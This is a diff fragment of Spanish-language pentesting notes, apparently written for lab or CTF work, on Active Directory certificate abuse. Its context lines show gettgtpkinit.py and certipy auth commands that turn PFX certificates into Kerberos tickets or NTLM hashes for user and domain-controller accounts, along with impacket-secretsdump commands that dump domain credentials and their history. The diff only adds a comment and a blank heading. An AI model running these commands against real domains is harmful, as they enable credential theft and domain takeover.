@@ -94,7 +94,8 @@ python3 gettgtpkinit.py -cert-pfx ./usuario.pfx -pfx-pass 'clave123' -dc-ip 10.1
 # Ejemplo para MÁQUINA:
 python3 gettgtpkinit.py -cert-pfx ./DC01\$.pfx -dc-ip 10.10.10.10 'corp.local/dc01$' /tmp/dc.ccache
 
-##### SI FALLA GETTGTPKINIT USAREMOS CERTIPY
+##### SI FALLA GETTGTPKINIT USAREMOS CERTIPY 
+#### ESTO YA NOS DEVUELVE EL NTLM HASH
 certipy auth -pfx dc01.pfx -dc-ip 10.129.234.174 -username dc01$ -domain inlanefreight.local
 ```
 
@@ -154,6 +155,8 @@ impacket-secretsdump -k -no-pass -dc-ip 10.10.10.10 -just-dc-user Administrator 
 
 # Ejemplo para tratar de volcar todo lo posible
 impacket-secretsdump -k -no-pass -history -dc-ip 10.10.10.10 'CORP.LOCAL/DC01$'@DC01.CORP.LOCAL
+
+##
 ```
 
 ### Caso 4: Cuenta de Máquina Estándar (`WORKSTATION$` o `SERVER$`)
